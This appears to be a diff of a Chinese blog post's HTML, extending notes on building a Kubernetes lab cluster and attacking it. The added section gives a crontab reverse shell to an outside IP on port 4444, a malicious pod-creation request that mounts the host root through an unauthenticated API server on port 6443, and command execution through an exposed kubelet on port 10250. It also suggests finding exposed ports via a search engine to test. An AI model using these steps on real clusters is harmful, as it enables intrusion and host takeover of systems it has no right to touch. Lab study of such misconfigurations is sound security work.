@@ -133,7 +133,7 @@
     "keywords": ["k8s"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "482"
+    "wordCount": "977"
   }]
   </script>
 
@@ -562,7 +562,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-08-27T00:00:00&#43;00:00">27 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span>482 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+      <time datetime="2025-08-27T00:00:00&#43;00:00">27 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span>977 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
     
 
     
@@ -744,6 +744,8 @@
     <li><a href="#k8s集群渗透">K8S集群渗透</a>
       <ul>
         <li><a href="#1api-server未授权访问kubelet未授权访问">1：API Server未授权访问&amp;kubelet未授权访问</a></li>
+        <li><a href="#2攻击6443端口api-server未授权访问">2、攻击6443端口：API Server未授权访问</a></li>
+        <li><a href="#3攻击10250端口kubelet未授权访问">3、攻击10250端口：kubelet未授权访问</a></li>
       </ul>
     </li>
   </ul>
@@ -763,6 +765,8 @@
     <li><a href="#k8s集群渗透">K8S集群渗透</a>
       <ul>
         <li><a href="#1api-server未授权访问kubelet未授权访问">1：API Server未授权访问&amp;kubelet未授权访问</a></li>
+        <li><a href="#2攻击6443端口api-server未授权访问">2、攻击6443端口：API Server未授权访问</a></li>
+        <li><a href="#3攻击10250端口kubelet未授权访问">3、攻击10250端口：kubelet未授权访问</a></li>
       </ul>
     </li>
   </ul>
@@ -915,7 +919,8 @@ ip link delete tunl0 2&gt;/dev/null || true
 kubectl apply -f calico-3.9.2.yaml
 
 
-各种问题后成功的配置
+各种问题后成功的配置-----------------
+ 
 关键
 containerd config default &gt; /etc/containerd/config.toml
  
@@ -925,7 +930,7 @@ vim /etc/containerd/config.toml
 SystemdCgroup = false 改为 SystemdCgroup = true
  
 sandbox_image = &#34;k8s.gcr.io/pause:3.6&#34; 改为：
-sandbox_image = &#34;registry.aliyuncs.com/google_containers/pause:3.6&#34;
+sandbox_image = &#34;registry.aliyuncs.com/google_containers/pause:3.6&#34;  docker镜像可能要改
 {
  &#34;registry-mirrors&#34;: [
     &#34;https://docker.hpcloud.cloud&#34;,
@@ -941,6 +946,159 @@ sandbox_image = &#34;registry.aliyuncs.com/google_containers/pause:3.6&#34;
 ],
 &#34;exec-opts&#34;: [&#34;native.cgroupdriver=systemd&#34;]
 }
+
+yum install wget
+wget https://kuboard.cn/install-script/calico/calico-3.9.2.yaml
+export POD_SUBNET=10.244.0.0/16
+sed -i &#34;s#192\.168\.0\.0/16#${POD_SUBNET}#&#34; calico-3.9.2.yaml
+kubectl apply -f calico-3.9.2.yaml
+
+systemctl stop firewalld &amp;&amp; systemctl disable firewalld
+sed -i &#39;s/enforcing/disabled/&#39; /etc/selinux/config &amp;&amp; setenforce 0
+rm -rf /etc/yum.repos.d/* 
+curl -o /etc/yum.repos.d/aliyun.repo https://mirrors.aliyun.com/repo/Centos-7.repo
+
+
+2：
+cat &gt;&gt;/etc/hosts &lt;&lt;EOF
+192.168.180.110 k8s-master
+192.168.180.120 k8s-node1
+192.168.180.130 k8s-node2
+EOF
+
+3
+hostnamectl set-hostname k8s-master &amp;&amp; bash
+hostnamectl set-hostname k8s-node1 &amp;&amp; bash
+hostnamectl set-hostname k8s-node2 &amp;&amp; bash
+4
+#k8s-master:
+yum install chrony -y
+vim /etc/chrony.conf
+server ntp6.aliyun.com iburst
+allow 192.168.0.0/16
+systemctl enable chronyd.service
+systemctl restart chronyd.service
+chronyc sources
+chronyc -a makestep
+ 
+ 
+#k8s-node1/k8s-node2:
+yum install chrony -y
+vim /etc/chrony.conf
+server k8s-master iburst
+systemctl enable chronyd.service
+systemctl restart chronyd.service
+chronyc sources
+ 
+#关闭交换分区
+swapoff -a
+sed -ri &#39;s/.*swap.*/#&amp;/&#39; /etc/fstab
+
+5
+modprobe br_netfilter
+cat &gt; /etc/sysctl.conf &lt;&lt; EOF
+net.ipv4.ip_forward = 1
+net.bridge.bridge-nf-call-ip6tables = 1
+net.bridge.bridge-nf-call-iptables = 1
+EOF
+ 
+sysctl -p
+
+6
+yum install -y conntrack ntpdate ntp ipvsadm ipset iptables curl sysstat libseccomp wget vim net-tools git
+cat &gt; /etc/sysconfig/modules/ipvs.modules &lt;&lt;EOF
+#!/bin/bash
+modprobe -- ip_vs
+modprobe -- ip_vs_rr
+modprobe -- ip_vs_wrr
+modprobe -- ip_vs_sh
+EOF
+ 
+chmod 755 /etc/sysconfig/modules/ipvs.modules &amp;&amp; bash /etc/sysconfig/modules/ipvs.modules &amp;&amp; lsmod | grep -e ip_vs -e nf_conntrack_ipv4
+lsmod | grep -e ip_vs -e nf_conntrack
+
+7
+cat &lt;&lt; EOF &gt; /etc/modules-load.d/containerd.conf
+overlay
+br_netfilter
+EOF
+ 
+modprobe overlay
+modprobe br_netfilter
+wget -O /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
+ 
+#安装docker
+yum install -y containerd.io docker-ce docker-ce-cli
+mkdir /etc/containerd -p 
+containerd config default &gt; /etc/containerd/config.toml
+ 
+#修改文件
+vim /etc/containerd/config.toml
+SystemdCgroup = false 改为 SystemdCgroup = true
+ 
+sandbox_image = &#34;k8s.gcr.io/pause:3.6&#34; 改为：
+sandbox_image = &#34;registry.aliyuncs.com/google_containers/pause:3.6&#34;
+ 
+#docker加速
+cat &gt; /etc/docker/daemon.json &lt;&lt;EOF
+{
+ &#34;registry-mirrors&#34;: [
+        &#34;https://do.nark.eu.org&#34;,
+        &#34;https://dc.j8.work&#34;,
+        &#34;https://docker.m.daocloud.io&#34;,
+        &#34;https://dockerproxy.com&#34;,
+        &#34;https://docker.mirrors.ustc.edu.cn&#34;,
+        &#34;https://docker.nju.edu.cn&#34;
+],
+&#34;exec-opts&#34;: [&#34;native.cgroupdriver=systemd&#34;]
+}
+EOF
+ 
+systemctl enable containerd &amp;&amp; systemctl start containerd
+systemctl enable docker &amp;&amp; systemctl start docker
+ 
+ 
+ 8
+ cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo
+[kubernetes]
+name=Kubernetes
+baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/
+enabled=1
+gpgcheck=0
+repo_gpgcheck=0
+gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg
+EOF
+ 
+yum clean all 
+yum makecache fast
+9
+#安装指定版本
+yum install -y kubelet-1.23.0-0 kubeadm-1.23.0-0 kubectl-1.23.0-0 --disableexcludes=kubernetes
+ 
+vim /etc/sysconfig/kubelet
+KUBELET_EXTRA_ARGS=&#34;--cgroup-driver=systemd&#34;
+ 
+systemctl enable kubelet &amp;&amp; systemctl start kubelet
+ 
+#初始化
+kubeadm init --kubernetes-version=v1.23.0 --pod-network-cidr=10.244.0.0/16 --image-repository registry.aliyuncs.com/google_containers --apiserver-advertise-address 192.168.180.110
+ 
+#这个是初始化成功后有显示的
+export KUBECONFIG=/etc/kubernetes/admin.conf
+mkdir -p $HOME/.kube
+sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
+sudo chown $(id -u):$(id -g) $HOME/.kube/config
+
+10
+#master初始化成功后将这一段复制到两个节点上加入群集
+kubeadm join 192.168.180.110:6443 --token 8zgrg1.dwy5s6rqzzhlkkdl  --discovery-token-ca-cert-hash sha256:9dfa30a7a8314887ea01b05cc26e80856bfd253d1a71de7cd5501c42f11c0326
+11
+kubectl apply -f https://docs.projectcalico.org/manifests/calico.yaml
+kubectl get pod -n kube-system -o wide
+ 
+这里只需要等待他们全部running即可
+ 
+kubectl get nodes
 </code></pre>
 <h2 class="relative group">K8S集群渗透 
     <div id="k8s集群渗透" class="anchor"></div>
@@ -951,6 +1109,20 @@ sandbox_image = &#34;registry.aliyuncs.com/google_containers/pause:3.6&#34;
     </span>        
     
 </h2>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/k8s-1/4.png">
+
+  
+</figure>
+</p>
+<p>确保都running不然实验不行而且版本要合适</p>
 
 <h3 class="relative group">1：API Server未授权访问&amp;kubelet未授权访问 
     <div id="1api-server未授权访问kubelet未授权访问" class="anchor"></div>
@@ -978,6 +1150,8 @@ sandbox_image = &#34;registry.aliyuncs.com/google_containers/pause:3.6&#34;
 cd /etc/kubernetes/manifests/
 - --insecure-port=8080
 - --insecure-bind-address=0.0.0.0
+
+kubectl get pod -n kube-system -o wide查看K8S网络工具搭建情况
 </code></pre><p>
 
 
@@ -1056,6 +1230,166 @@ spec:
 
 <figure>
     <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/k8s-1/3.png">
+
+  
+</figure>
+</p>
+<p>echo -e &ldquo;* * * * * root bash -i &gt;&amp; /dev/tcp/116.62.32.64/4444 0&gt;&amp;1\n&rdquo; &raquo; /mnt/etc/crontab反弹获得本机shell</p>
+<p>成功拿下这台docker镜像的本机node1</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/k8s-1/5.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">2、攻击6443端口：API Server未授权访问 
+    <div id="2攻击6443端口api-server未授权访问" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#2%e6%94%bb%e5%87%bb6443%e7%ab%af%e5%8f%a3api-server%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<pre tabindex="0"><code>一些集群由于鉴权配置不当，将&#34;system:anonymous&#34;用户绑定到&#34;cluster-admin&#34;用户组，从而使6443端口允许匿名用户以管理员权限向集群内部下发指令。
+
+kubectl create clusterrolebinding system:anonymous   --clusterrole=cluster-admin   --user=system:anonymous
+</code></pre><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/k8s-1/6.png">
+
+  
+</figure>
+</p>
+<p>记得用https访问</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/k8s-1/7.png">
+
+  
+</figure>
+</p>
+<p>发恶意yaml文件包</p>
+<p>https://192.168.139.130:6443/api/v1/namespaces/default/pods/</p>
+<pre tabindex="0"><code>POST：{&#34;apiVersion&#34;:&#34;v1&#34;,&#34;kind&#34;:&#34;Pod&#34;,&#34;metadata&#34;:{&#34;annotations&#34;:{&#34;kubectl.kubernetes.io/last-applied-configuration&#34;:&#34;{\&#34;apiVersion\&#34;:\&#34;v1\&#34;,\&#34;kind\&#34;:\&#34;Pod\&#34;,\&#34;metadata\&#34;:{\&#34;annotations\&#34;:{},\&#34;name\&#34;:\&#34;test02\&#34;,\&#34;namespace\&#34;:\&#34;default\&#34;},\&#34;spec\&#34;:{\&#34;containers\&#34;:[{\&#34;image\&#34;:\&#34;nginx:1.14.2\&#34;,\&#34;name\&#34;:\&#34;test02\&#34;,\&#34;volumeMounts\&#34;:[{\&#34;mountPath\&#34;:\&#34;/host\&#34;,\&#34;name\&#34;:\&#34;host\&#34;}]}],\&#34;volumes\&#34;:[{\&#34;hostPath\&#34;:{\&#34;path\&#34;:\&#34;/\&#34;,\&#34;type\&#34;:\&#34;Directory\&#34;},\&#34;name\&#34;:\&#34;host\&#34;}]}}\n&#34;},&#34;name&#34;:&#34;test02&#34;,&#34;namespace&#34;:&#34;default&#34;},&#34;spec&#34;:{&#34;containers&#34;:[{&#34;image&#34;:&#34;nginx:1.14.2&#34;,&#34;name&#34;:&#34;test02&#34;,&#34;volumeMounts&#34;:[{&#34;mountPath&#34;:&#34;/host&#34;,&#34;name&#34;:&#34;host&#34;}]}],&#34;volumes&#34;:[{&#34;hostPath&#34;:{&#34;path&#34;:&#34;/&#34;,&#34;type&#34;:&#34;Directory&#34;},&#34;name&#34;:&#34;host&#34;}]}}
+</code></pre><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/k8s-1/8.png">
+
+  
+</figure>
+</p>
+<p>成功创建pod 并且挂载到host里面一样使用mnt提权</p>
+<p>进入方式</p>
+<pre tabindex="0"><code>1
+
+kubectl --insecure-skip-tls-verify -s https://192.168.79.131:6443 --namespace=default exec -it heikea bash
+kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
+Please enter Username: r
+root@heikea:/#
+root@heikea:/#
+root@heikea:/#
+
+2
+
+kubectl.exe -s 192.168.79.131:8080 --namespace=default exec -it heikea bash
+</code></pre>
+<h3 class="relative group">3、攻击10250端口：kubelet未授权访问 
+    <div id="3攻击10250端口kubelet未授权访问" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#3%e6%94%bb%e5%87%bb10250%e7%ab%af%e5%8f%a3kubelet%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>配置问题</p>
+<pre tabindex="0"><code>https://192.168.79.131:10250/pods
+
+
+/var/lib/kubelet/config.yaml
+
+修改authentication的anonymous为true,
+
+将authorization mode修改为AlwaysAllow,
+
+重启kubelet进程-systemctl restart kubelet
+</code></pre><p>没有配置的时候进不去一旦修改</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/k8s-1/9.png">
+
+  
+</figure>
+</p>
+<p>修改后</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/k8s-1/10.png">
+
+  
+</figure>
+</p>
+<p>获得三个信息</p>
+<pre tabindex="0"><code>1：namespace= kube-system
+
+2:   pod= etcd-master-1
+
+3:   container =etcd
+
+curl -XPOST -k &#34;https://192.168.79.131:10250/run/kube-system/etcd-master-1/etcd&#34; -d &#34;cmd=id&#34;
+
+成功命令执行
+被攻击的 Docker 镜像对应的是 kube-scheduler 组件
+该请求的本质是通过 Kubelet 的 10250 端口（默认只读端口，若被配置为可写则存在风险），在 kube-scheduler-master-1 Pod 的 kube-scheduler 容器内执行命令（如 id）
+在fofa搜索port=&#34;10250&#34; 6443测试
+</code></pre><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/k8s-1/11.png">
 
   
 </figure>
@@ -1393,7 +1727,7 @@ spec:
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-08-25T00:00:00&#43;00:00">25 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span>102 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+      <time datetime="2025-08-25T00:00:00&#43;00:00">25 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span>216 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
     
 
     
